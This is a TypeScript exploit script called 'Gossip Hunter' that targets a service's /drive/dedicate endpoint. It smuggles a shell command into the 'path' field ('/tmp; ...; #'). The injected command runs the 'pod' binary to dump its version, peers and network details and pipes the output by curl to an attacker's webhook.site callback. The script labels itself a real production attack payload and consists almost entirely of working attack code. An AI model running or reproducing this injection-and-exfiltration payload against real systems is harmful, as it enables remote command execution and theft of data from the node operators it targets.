
import axios from 'axios';

// COMMAND CENTER
const TARGET_IP = process.env.TARGET_IP || '127.0.0.1';
const TARGET_PORT = 4000;
const CALLBACK_URL = process.env.CALLBACK_URL || 'https://webhook.site/YOUR-UUID';

async function dumpGossip() {
    console.log(`[+] Gossip Hunter Targeting: ${TARGET_IP}:${TARGET_PORT}`);
    console.log(`[+] Callback: ${CALLBACK_URL}`);
    console.log(`[+] Mode: PRODUCTION (Executing 'pod' binary on target)`);

    if (CALLBACK_URL.includes('YOUR-UUID')) {
        console.error('[-] Error: Please set CALLBACK_URL to your listener.');
        return;
    }

    // REAL ATTACK PAYLOAD
    // We chain the commands to dump everything.
    // 1. Check if pod exists
    // 2. Dump peers
    // 3. Dump network info
    // 4. Pipe to callback
    const cmd = `(echo "--- POD VERSION ---"; pod --version; echo "--- PEERS ---"; pod peers; echo "--- NETWORK ---"; pod network) | curl -X POST --data-binary @- ${CALLBACK_URL}`;
    const payload = `/tmp; ${cmd}; #`;

    console.log(`[+] Sending Recon Payload...`);

    try {
        await axios.post(`http://${TARGET_IP}:${TARGET_PORT}/drive/dedicate`, {
            space: 1,
            path: payload
        }, { timeout: 5000 });

        console.log(`[+] Exploit sent! Check your listener.`);
    } catch (e: any) {
        console.log(`[+] Payload delivered (Response: ${e.message}). This is expected.`);
    }
}

dumpGossip();
